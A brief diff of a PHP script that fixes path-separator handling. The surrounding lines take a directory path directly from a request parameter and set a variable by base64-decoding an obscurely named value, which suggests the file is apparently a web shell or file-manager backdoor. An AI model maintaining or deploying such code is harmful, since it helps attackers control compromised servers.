@@ -328,8 +328,8 @@ $path = $_GET['path'];
 }else{
 $path = getcwd();
 }
-$path = str_replace('\\',' / ',$path);
-$paths = explode(' / ',$path);
+$path = str_replace('\\','/',$path);
+$paths = explode('/',$path);
 $home_r = $_SERVER['DOCUMENT_ROOT'];
 $_COPY = base64_decode($_c7e);
 if(get_magic_quotes_gpc()){
